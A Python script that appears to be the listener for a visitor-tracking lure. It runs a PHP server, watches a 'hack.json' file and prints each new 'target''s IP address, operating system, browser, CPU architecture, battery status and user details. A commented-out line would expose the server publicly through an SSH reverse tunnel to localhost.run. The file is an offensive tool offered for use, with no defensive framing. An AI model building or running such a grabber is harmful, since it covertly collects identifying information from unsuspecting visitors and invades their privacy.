import json,requests,os,subprocess,sys,time
from colorama import Fore , init
init()
import requests


BBlack = "\033[1;30m"  # Black
BRed = "\033[1;31m"  # Red
BGreen = "\033[1;32m"  # Green
BYellow = "\033[1;33m"  # Yellow
BBlue = "\033[1;34m"  # Blue
BPurple = "\033[1;35m"  # Purple
BCyan = "\033[1;36m"  # Cyan
BWhite = "\033[1;37m"  # White
stat_file_logs = 0
counter = 0
try:
    enteruser = sys.argv[1]
except IndexError:
    print('Python IP.py localhost:port ,,, 127.0.0.1:port')

try:

    try:
        with open('local.log' , 'w') as file:
            subprocess.Popen(('sudo' , 'su'),stderr=file , stdout=file)
            subprocess.Popen(('php' , '-S' , enteruser),stderr=file , stdout=file)
            print(f'{BGreen}RUN SERVER on http://{enteruser}')
            # finalserver = subprocess.Popen(('ssh', '-R' ,f'80:{enteruser}','nokey@localhost.run'),stderr=file , stdout=file)
            # print(finalserver)
    except NameError:
        sys.exit(0)
    while True:
        a = time.localtime()
        ba = a.tm_hour , ":" , a.tm_min , ":" , a.tm_sec
        if not str(os.stat("hack.json").st_size) == stat_file_logs:
            stat_file_logs = str(os.stat("hack.json").st_size)
            file_ip = open("hack.json", 'r')
            i = file_ip.readlines()
            try:
                i = i[-1]
                i = i.strip()
                file = open('hack.json', 'r')
                info = json.load(file)
                infoIP = info['Os-Ip']
                openfileip = open(infoIP+'.txt' , 'w')
                counter +=1 
                print(f'''
====================================================================
{BWhite}New Target => {counter}
====================================================================
                ''')
                print(a.tm_hour,":",a.tm_min,":",a.tm_sec)
                print(f"\n{BRed}ip : "+info['Os-Ip'] + "        ")
                print(f"\n{BGreen}Os_name : "+info['Os-Name'] + "        ")
                print(f"\n{BPurple}Browser-Name : "+info['Browser-Name'] + "        ")
                print(f"\n{BCyan}CPU-Architecture : " + info['CPU-Architecture'] +"        ")
                print(f"\n{BBlue}batry : "+info['batry'] + "        ")
                print(f"\n{BGreen}user : "+info['user'] + "        ")
                o = open("hack.json", "w")
                o.write("")
                o.close()
            except:
                print("")
except KeyboardInterrupt:
    sys.exit()